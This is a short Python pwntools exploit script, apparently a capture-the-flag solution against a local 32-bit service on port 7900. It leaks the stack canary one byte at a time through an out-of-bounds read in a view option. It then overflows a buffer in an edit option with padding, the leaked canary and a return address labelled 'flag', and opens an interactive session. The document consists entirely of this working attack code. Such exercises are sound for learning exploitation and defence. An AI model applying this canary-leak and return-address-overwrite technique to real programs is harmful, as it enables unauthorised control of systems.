from pwn import *
context.log_level='debug'
context.arch='i386'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
#p=process('./pwn')
p=remote("127.0.0.1", 7900)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)


v7 = 0x84
can = v7-4
canary = b""

ru(">")
for i in range(4):
    p1 = b"V\n" + str(can+i).encode()
    sl(p1)
    rec = ru(">")
    num = rec.split(b" : ")[2][:2]
    num = int(num, 16)
    print(num)
    canary += num.to_bytes(1, 'little')

print(hex(u32(canary)))

v23 = 0x44
flag = 0x8049304

p1 = b"E\n" + str(v23+8).encode() + b"\n" + \
    b"A" * (v23-4) + canary + b"A" * 4 + p32(flag)

sl(p1)




#gdb.attach(p)
p.interactive()
